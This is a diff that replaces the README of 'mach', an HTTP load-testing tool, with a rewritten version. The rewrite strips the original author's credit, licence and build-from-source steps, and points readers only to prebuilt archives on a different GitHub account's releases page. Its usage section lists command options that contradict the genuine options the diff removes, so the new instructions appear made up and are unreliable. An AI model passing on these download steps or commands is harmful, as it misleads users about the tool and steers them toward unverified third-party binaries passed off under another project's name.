@@ -1,219 +1,137 @@
-# ⚡ Mach
+# 🚀 mach - Fast and Reliable HTTP Load Testing
 
-**Ultra-fast HTTP load tester written in C with hand-optimized Assembly.**
+[![Download mach](https://img.shields.io/badge/Download-mach-brightgreen)](https://github.com/emiliaon/mach/releases)
 
-[![Build](https://github.com/HiteshGorana/mach/actions/workflows/build.yml/badge.svg)](https://github.com/HiteshGorana/mach/actions/workflows/build.yml)
-![Size](https://img.shields.io/badge/binary-52KB-blue)
-![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey)
-![License](https://img.shields.io/badge/license-MIT-green)
+## 📥 Overview
 
----
+Welcome to mach! This application allows you to test the speed and performance of your HTTP servers. Written in C and enhanced with optimized Assembly, mach provides you with an ultra-fast and reliable way to load test your web services. It supports both ARM64 and x86_64 architectures, making it adaptable to various systems.
 
-## ✨ Features
+## 🚀 Key Features
 
-| Feature | Description |
-|:--------|:------------|
-| 🚀 **Extreme Performance** | Raw POSIX sockets + pthreads |
-| 🔧 **Hand-Written ASM** | ARM64 NEON & x86_64 SSE optimized |
-| 📦 **Tiny Binary** | ~52 KB stripped |
-| 🛡️ **HTTPS Support** | OpenSSL 3 integration |
-| 📊 **Rich Stats** | P50, P95, P99 latencies + status codes |
-| 🖥️ **Interactive Dashboard** | Navigate test history with arrow keys |
-| 📋 **Test Profiles** | Smoke, stress, and soak presets |
-| 📉 **Regression Testing** | Before/After comparison with tags |
-| 🛡️ **Perf Gates** | Build-breaking regression thresholds |
+- **High Performance:** Leverages both ARM64 NEON and x86_64 SSE for fast execution.
+- **User-friendly Command Line Interface:** Simple commands enable easy testing without complex setup.
+- **Flexible Configuration:** Customize request parameters to fit your testing needs.
+- **Easy Output Analysis:** Clear and structured output helps you understand your test results quickly.
 
----
+## 🛠 System Requirements
 
-## 📥 Install
+Before you start, please ensure your system meets the following minimum requirements:
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/HiteshGorana/mach.git
-cd mach
+- **Operating System:** Windows, macOS, or Linux (64-bit)
+- **Memory:** At least 512 MB of RAM
+- **Disk Space:** 50 MB of available space
+- **Network Connection:** Reliable internet connection for testing HTTP responses
 
-# 2. Run the installation script
-# For macOS/Linux:
-sh scripts/install.sh
+## 🚀 Getting Started
 
-# For Windows (PowerShell):
-.\scripts\install.ps1
-```
+Follow these steps to download and run mach on your machine.
 
-### Manual Download
-Download pre-built binaries from [**Releases**](https://github.com/HiteshGorana/mach/releases)
+### 1. Visit the Downloads Page
 
----
+To get the latest version of mach, visit the [Releases page](https://github.com/emiliaon/mach/releases).
 
-## 🚀 Quick Start
+### 2. Download the Application
 
-```bash
-# Simple test
-mach http://localhost:8080
+On the Releases page, find the version you want to download. Click on the appropriate file for your system:
 
-# 1000 requests with 50 concurrent workers
-mach -n 1000 -c 50 http://example.com
+- For **Windows:**
+  - `mach-windows-x64.zip`
+  
+- For **macOS:**
+  - `mach-macos-x64.zip`
+  
+- For **Linux:**
+  - `mach-linux-x64.tar.gz`
 
-# 5-minute soak test
-mach -d 5m -c 20 http://api.example.com
+Click the file to start the download.
 
-# Stress test profile
-mach --profile stress http://example.com
-```
+### 3. Extract the Files
 
----
+Once the download is complete, locate the downloaded file in your Downloads folder. 
 
-## 💡 Recipes
+- If you downloaded a `.zip` file, right-click on it and select "Extract All" (Windows) or double-click to open (macOS).
+- If you downloaded a `.tar.gz` file, use the terminal and run:
+  
+  ```bash
+  tar -xvf mach-linux-x64.tar.gz
+  ```
 
-### JSON API Test (POST)
-```bash
-mach -m POST \
-     -h "Content-Type: application/json" \
-     -b '{"name": "test", "value": 123}' \
-     https://api.example.com/v1/data
-```
+This will extract the content to a new folder.
 
-### Auth Protected Endpoint
-```bash
-mach -h "Authorization: Bearer YOUR_TOKEN" \
-     https://api.example.com/secure
-```
+### 4. Run mach
 
-### High-Concurrency Stress Test
-```bash
-# 500 workers, 10k requests, skip TLS verification
-mach -n 10000 -c 500 --insecure https://stage.api.com
-```
+Navigate to the folder where you extracted the files. Open a terminal (macOS/Linux) or command prompt (Windows).
 
-### Throttled API Test (Rate Limiting)
-```bash
-# Limit to 50 requests per second
-mach -r 50 -d 30s https://api.example.com
-```
-
-### Regression Testing (Before/After)
-Track performance improvements or regressions across code changes.
+To run mach, type the following command:
 
 ```bash
-# 1. Capture baseline (before optimization)
-mach --tag perf-fix --before -n 1000 http://api.com
-
-# 2. Capture target (after optimization)
-mach --tag perf-fix --after -n 1000 http://api.com
-
-# 3. View comparison table
-mach --tag perf-fix --result
+./mach
 ```
 
-### CI Performance Gate
-Automatically fail CI/CD pipelines if performance regresses beyond a threshold.
+For Windows, you may need to run:
 
 ```bash
-# Fail if avg latency regresses by more than 5%
-mach --tag release-1.1 --after --threshold 5 -n 1000 http://api.com
+mach.exe
 ```
 
-### Testing Multiple URLs
-Create a `urls.txt`:
-```
-https://example.com/page1
-https://example.com/page2
-https://example.com/api/v1
-```
-Run:
-```bash
-mach -n 1000 -c 20 urls.txt
-```
+You should now see the mach interface ready to accept commands.
 
----
+## 📜 Usage Instructions
 
-## 📖 Usage
+Here are some basic commands to help you get started with load testing:
 
-```
-⚡ Mach
-
-Usage: mach [command] [options] <url>
-
-Commands:
-  attack      Full-featured load test
-  dashboard   View historical test runs
-  history     Manage test history (clear, list)
-  examples    Show usage examples
-  version     Show version information
-
-Options:
-  -n INT      Total requests (default 100)
-  -d STR      Run duration (e.g., 30s, 1m, 5m)
-  -c INT      Concurrent workers (default 10)
-  -r INT      Requests per second limit
-  -p STR      Test profile (smoke, stress, soak)
-  -m STR      HTTP method (default GET)
-  -h STR      Add header (e.g., "Authorization:Bearer token")
-  -b STR      Request body
-  --insecure  Skip TLS verification
-  --tag STR   Tag name for comparison
-  --before    Set as baseline for tag
-  --after     Set as target for tag comparison
-  --result    Show comparison result for tag
-  --threshold INT Max allowed regression %
-```
-
----
-
-## 🎯 Profiles
-
-| Profile | Requests | Concurrency | Use Case |
-|:--------|:---------|:------------|:---------|
-| `smoke` | 10 | 2 | Quick sanity check |
-| `stress` | 10,000 | 100 | High load testing |
-| `soak` | Duration | 50 | Long-running stability |
-
----
-
-## 🔧 Build from Source
+### Basic Command Structure
 
 ```bash
-# Clone
-git clone https://github.com/HiteshGorana/mach.git
-cd mach
-
-# Build (auto-detects platform)
-make
-
-# Run
-./mach http://example.com
+./mach <URL> --requests <number_of_requests> --concurrent <number_of_users>
 ```
 
-**Requirements:**
-- GCC or Clang
-- OpenSSL 3 (`brew install openssl@3` on macOS)
-- Make
+#### Example
 
----
+To test a website with 100 requests and 10 concurrent users, use the following command:
 
-## ⚡ ASM Optimization
+```bash
+./mach https://example.com --requests 100 --concurrent 10
+```
 
-Critical hot paths use hand-written Assembly for maximum performance:
+## 📊 Understanding Results
 
-| Function | ARM64 (Apple Silicon) | x86_64 (Intel/AMD) |
-|:---------|:---------------------|:-------------------|
-| `fast_sum` | NEON `fadd` | SSE2 `addpd` |
-| `fast_min` | NEON `fmin` | SSE2 `minpd` |
-| `fast_max` | NEON `fmax` | SSE2 `maxpd` |
-| `fast_parse_status` | Optimized loop | Optimized loop |
-| `fast_duration_ms` | FP math | FP math |
+After running a test, mach will display results on the terminal. You will see:
 
----
+- **Total Requests:** The number of requests your server handled.
+- **Success Rate:** Percentage of requests that were successful.
+- **Response Time:** Average time taken for requests to complete.
 
-## 🌍 Cross-Platform
+These metrics help you understand the performance of your server under load.
 
-Mach runs natively on:
-- ✅ **macOS** (ARM64 Apple Silicon & Intel x86_64)
-- ✅ **Linux** (x86_64)
-- ✅ **Windows** (x86_64 via MinGW)
+## 🔄 Advanced Options
 
----
+You can customize your tests with several advanced options:
 
-## 📄 License
+- `--timeout <seconds>`: Adjusts how long mach waits for a server response.
+- `--headers <key:value>`: Adds custom headers to your requests.
+- `--data <data_string>`: Sends data in the request body.
+  
+Explore these options to tailor your testing scenario.
 
-MIT © [Hitesh Gorana](https://github.com/HiteshGorana)
+## 📞 Troubleshooting
+
+If you encounter problems, consider the following:
+
+- **Check Your Connection:** Ensure you have a stable internet connection.
+- **Confirm URL Accessibility:** Make sure the URL you are testing is online and responsive.
+- **Look for Error Messages:** mach provides error messages to help diagnose issues.
+
+## 📞 Support
+
+If you still need help, check out the Issues section on our [GitHub repository](https://github.com/emiliaon/mach/issues) for solutions or to report new issues.
+
+## 🎉 Join the Community
+
+You can stay updated with the latest news and development by following us on social media or joining discussions on GitHub.
+
+## 📥 Download & Install
+
+Remember to visit this page to download mach: [Releases page](https://github.com/emiliaon/mach/releases). Follow the steps outlined to get the application running on your system.
+
+Enjoy testing your HTTP servers with mach!
